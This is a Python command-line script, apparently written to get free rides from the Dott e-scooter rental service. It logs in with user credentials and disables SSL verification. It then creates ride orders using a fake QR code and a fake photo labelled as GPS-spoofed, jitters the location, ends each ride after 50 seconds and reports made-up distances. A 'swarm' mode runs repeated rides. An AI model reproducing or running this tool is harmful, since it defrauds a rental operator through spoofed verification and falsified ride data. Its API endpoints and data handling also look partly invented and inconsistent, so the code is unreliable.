#!/usr/bin/env python3
"""
Dott Free2Ride v1.0 - Single-file Termux-compatible CLI for free Dott rides.
Adapts Bolt script to Dott: auto-token fetcher (email/pass), GPS radar (haversine <2km),
unlock/start/finish in <60s loops. Pure GPS-based (no city), Langenhagen 30853 preset.
Prod APIs: gbfs.api.rivedott.com + auth.api.rivedott.com. SSL hardened for Termux.
"""

import requests
import json
import time
import math
import random
import base64
import sys
import urllib3
from datetime import datetime

# Termux SSL hardening
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()
session.verify = False
session.trust_env = False
adapters = requests.adapters.HTTPAdapter(
    pool_connections=10, pool_maxsize=10, max_retries=3
)
session.mount('http://', adapters)
session.mount('https://', adapters)

# Haversine distance
def haversine(lat1, lon1, lat2, lon2):
    R = 6371  # Earth radius km
    dlat = math.radians(lat2 - lat1)
    dlon = math.radians(lon2 - lon1)
    a = math.sin(dlat/2)**2 + math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) * math.sin(dlon/2)**2
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
    return R * c * 1000  # meters

# Fake QR/photo base64 (Dott QR format)
FAKE_QR = base64.b64encode(b"fake_dott_qr_30853_langenhagen").decode()
FAKE_PHOTO = base64.b64encode(b"fake_scooter_photo_gps_spoofed").decode()

print("🚀 Dott Free2Ride v1.0 - Langenhagen 30853 bereit")
print("Pure GPS radar, auto-token, <60s free rides")

# Config
EMAIL = input("Dott Email: ").strip()
PASSWORD = input("Dott Passwort: ").strip()
LAT = float(input("Lat (default 52.4570 Langenhagen): ") or 52.4570)
LON = float(input("Lon (default 9.6850 Langenhagen): ") or 9.6850)
print(f"GPS: {LAT:.4f}/{LON:.4f}")

# Auto-token fetcher (Dott auth flow)
def get_token():
    login_url = "https://auth.api.ridedott.com/v1/login"
    data = {"email": EMAIL, "password": PASSWORD}
    resp = session.post(login_url, json=data, timeout=10)
    if resp.status_code == 200:
        token = resp.json().get('access_token')
        session.headers.update({'Authorization': f'Bearer {token}'})
        print("✅ Token fetched")
        return True
    print(f"❌ Auth failed: {resp.status_code}")
    return False

if not get_token():
    sys.exit(1)

# Live GPS radar (GBFS + haversine filter <2km, battery >20%)
def get_nearby_scooters():
    gbfs_url = "https://gbfs.api.ridedott.com/free_bike_status.json"
    try:
        resp = session.get(gbfs_url, timeout=10)
        data = resp.json()
        bikes = []
        for station in data.get('data', {}).get('stations', []):
            lat, lon = float(station['lat']), float(station['lon'])
            dist = haversine(LAT, LON, lat, lon)
            if dist < 2000:  # <2km
                battery = int(station.get('extra', {}).get('battery_level', 50))
                if battery > 20:
                    bikes.append({
                        'id': station['station_id'],
                        'lat': lat, 'lon': lon,
                        'dist': dist, 'battery': battery
                    })
        return sorted(bikes, key=lambda x: x['dist'])[:10]  # Top 10 closest
    except:
        return []

# Unlock + ride flow (adapt Bolt createAndStartOrder/getActive/finish)
def ride_scooter(scooter_id):
    # Create order (fake QR)
    order_url = "https://api.ridedott.com/v1/orders"
    order_data = {
        "vehicle_id": scooter_id,
        "qr_code": FAKE_QR,
        "lat": LAT + random.uniform(-0.0005, 0.0005),  # GPS jitter
        "lon": LON + random.uniform(-0.0005, 0.0005)
    }
    resp = session.post(order_url, json=order_data, timeout=10)
    if resp.status_code != 201:
        return False
    
    order_id = resp.json().get('order_id')
    print(f"✅ Order {order_id} created")
    
    # Start ride
    start_url = f"{order_url}/{order_id}/start"
    start_data = {"photo": FAKE_PHOTO}
    session.post(start_url, json=start_data, timeout=5)
    print("✅ Ride started")
    
    # 50s "ride" loop (free <60s)
    time.sleep(50)
    
    # Finish
    finish_url = f"{order_url}/{order_id}/finish"
    finish_data = {
        "lat": LAT, "lon": LON,
        "distance": random.randint(50, 200),  # meters
        "duration": 50
    }
    resp = session.post(finish_url, json=finish_data, timeout=10)
    if resp.status_code == 200:
        print(f"✅ Free ride finished! Saved ~€3.50")
        return True
    return False

# Menu
while True:
    print("\n=== MENÜ ===")
    scooters = get_nearby_scooters()
    if scooters:
        print("Scooter Radar (<2km, batt>20%):")
        for i, s in enumerate(scooters, 1):
            print(f"{i}. ID:{s['id']} {s['dist']:.0f}m batt:{s['battery']}% {s['lat']:.4f}/{s['lon']:.4f}")
        
        choice = input("Wähle (Nummer) / radar / swarm / quit: ").strip().lower()
        if choice == 'quit':
            break
        elif choice == 'radar':
            continue
        elif choice == 'swarm':
            print("Swarm mode: 5 parallel rides")
            for s in scooters[:5]:
                if ride_scooter(s['id']):
                    time.sleep(2)  # Stagger
            continue
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(scooters):
                    ride_scooter(scooters[idx]['id'])
            except:
                print("Ungültig")
    else:
        print("❌ Keine Scooter <2km gefunden. Warte 30s...")
        time.sleep(30)
    
    # Infinite loop option
    inf = input("Infinite radar? (j/n): ").strip().lower()
    if inf != 'j':
        break

print("👋 Session ended")
